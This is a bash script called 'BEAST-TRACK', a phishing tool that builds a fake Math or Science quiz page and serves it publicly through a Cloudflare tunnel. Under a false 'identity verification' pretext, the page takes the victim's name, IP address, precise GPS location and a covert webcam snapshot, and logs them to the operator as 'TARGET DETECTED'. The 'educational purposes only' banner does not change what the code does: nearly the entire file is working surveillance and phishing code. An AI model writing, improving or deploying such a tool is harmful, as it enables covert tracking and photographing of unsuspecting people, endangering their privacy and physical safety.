#!/bin/bash

# --- BEAST-TRACK v22.0 (FINAL FIXED & COMPLETE) ---
# WARNING: FOR EDUCATIONAL PURPOSES ONLY. 
# UNLAWFUL USE IS SUBJECT TO CYBERCRIME LAWS.

NC='\033[0m'; Bold='\033[1m'
PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'

SERVER_DIR="server"
PORT=8888

# --- PRE-SETUP ---
mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png $SERVER_DIR/*.log .link.log > /dev/null 2>&1
touch $SERVER_DIR/combined.log
chmod -R 777 $SERVER_DIR

clear
echo -e "${PBlue}${Bold}  ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
echo -e "${PBlue}${Bold}  ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ${NC}"
echo -e "${PWhite}${Bold}  ██████╔╝█████╗  ███████║███████╗   ██║    ${NC}"
echo -e "${PWhite}${Bold}  ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ██████╔╝███████╗██║  ██║███████║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ${NC}"
echo -e "  ${PYellow}⭐ ⭐ ⭐  QUIZ BEE TRACKER v22.0  ⭐ ⭐ ⭐${NC}"
echo -e "  ${BGreen}Status       : ${PWhite}Educational Purpose Only${NC}"
echo -e "${PWhite}  ==========================================${NC}"

echo -e "\n  ${BCyan}${Bold}[ SELECT QUIZ SUBJECT ]${NC}"
echo -e "  ${PWhite} 1. MATHEMATICS${NC}"
echo -e "  ${PBlue} 2. SCIENCE${NC}"
read -p $'\n  [*] Select ➤ ' q_opt

case $q_opt in
    1) SUBJECT="MATH"; S_COLOR="#3498db";;
    *) SUBJECT="SCIENCE"; S_COLOR="#2ecc71";;
esac

# --- GENERATE COMPLETE PHP & JS BACKEND ---
cat <<EOF > $SERVER_DIR/index.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$type = \$_POST['type'] ?? '';
    if (\$type == 'init') {
        \$log = "\n\033[1;33m┏━━━━━━━━━━━━ TARGET DETECTED ━━━━━━━━━━━━┓\033[0m\n";
        \$log .= "\033[1;37m┃ NAME      :\033[0m " . (\$_POST['name'] ?? 'Unknown') . "\n";
        \$log .= "\033[1;37m┃ SUBJECT   :\033[0m $SUBJECT\n";
        \$log .= "\033[1;37m┃ IP ADDR   :\033[0m \$ip\n";
    } elseif (\$type == 'loc') {
        \$log = "\033[1;32m┃ GPS DATA  :\033[0m " . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
        \$log .= "\033[1;34m┃ MAPS LINK :\033[0m https://www.google.com" . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
    } elseif (\$type == 'cam') {
        \$fname = 'cam_' . time() . '.png';
        file_put_contents(\$fname, base64_decode(str_replace(['data:image/png;base64,', ' '], ['', '+'], \$_POST['img'])));
        \$log = "\033[1;31m┃ CAM FILE  :\033[0m \$fname (CAPTURED!)\n\033[1;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m\n";
    }
    file_put_contents("combined.log", \$log, FILE_APPEND);
    exit();
}
?>
<!DOCTYPE html><html><head><title>$SUBJECT Quiz Challenge</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
    .box { border: 2px solid $S_COLOR; padding: 25px; border-radius: 15px; background: #111; max-width: 400px; margin: auto; box-shadow: 0 0 15px $S_COLOR; }
    input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
    .btn { background: $S_COLOR; color: #000; padding: 15px; width: 100%; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    #err-box { display: none; color: #ff6b6b; font-size: 13px; margin-top: 15px; border: 1px dashed red; padding: 10px; }
</style></head>
<body>
    <div class="box">
        <h1>$SUBJECT QUIZ</h1>
        <div id="setup">
            <p>Verification Required: Enter Full Name</p>
            <input type="text" id="name" placeholder="Juan Dela Cruz">
            <button class="btn" onclick="startTracking()">START ASSESSMENT</button>
            <div id="err-box">⚠️ <b>PERMISSION ERROR:</b> Please allow Camera and Location access to verify your identity.</div>
        </div>
        <div id="quiz" style="display:none;">
            <h3>Question 1 of 10</h3>
            <p>What is the main goal of Cybersecurity?</p>
            <button class="btn" onclick="alert('Submitted!')">Data Protection</button>
        </div>
    </div>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
    async function startTracking() {
        const name = document.getElementById('name').value;
        if(!name) return alert('Please enter your name');
        
        try {
            // Request Permissions
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;

            navigator.geolocation.getCurrentPosition(pos => {
                sendData({type: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude});
            }, err => console.log('Loc Denied'), {enableHighAccuracy:true});

            sendData({type: 'init', name: name});

            // Capture Frame
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                const video = document.getElementById('video');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                sendData({type: 'cam', img: canvas.toDataURL('image/png')});
                
                document.getElementById('setup').style.display = 'none';
                document.getElementById('quiz').style.display = 'block';
            }, 2500);

        } catch (e) {
            document.getElementById('err-box').style.display = 'block';
        }
    }

    function sendData(data) {
        let fd = new FormData();
        for(let k in data) fd.append(k, data[k]);
        fetch('index.php', {method: 'POST', body: fd});
    }
    </script>
</body></html>
EOF

# --- START SERVICES ---
echo -e "\n${PYellow}[*] Booting PHP Server...${NC}"
php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
PHP_PID=$!

echo -e "${BCyan}[*] Requesting Cloudflare Tunnel...${NC}"
cloudflared tunnel --url http://127.0.0.1:$PORT > .link.log 2>&1 &
CL_PID=$!

sleep 8
CL_LINK=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .link.log)

if [ -z "$CL_LINK" ]; then
    echo -e "${PRed}[!] CLOUDFLARED ERROR: Check your internet connection.${NC}"
    kill $PHP_PID $CL_PID
    exit 1
fi

echo -e "${BGreen}[+] LIVE LINK : ${Bold}${PWhite}$CL_LINK${NC}"
echo -e "${BGreen}[+] LOGS FILE : ${Bold}${PWhite}$SERVER_DIR/combined.log${NC}"
echo -e "${PYellow}--------------------------------------------------"
echo -e "  STAY ONLINE TO RECEIVE DATA (Ctrl+C to Exit)${NC}"

# Monitor Logs
trap "kill $PHP_PID $CL_PID; echo -e '\n${PRed}[!] Services Stopped.${NC}'; exit" SIGINT
tail -f $SERVER_DIR/combined.log
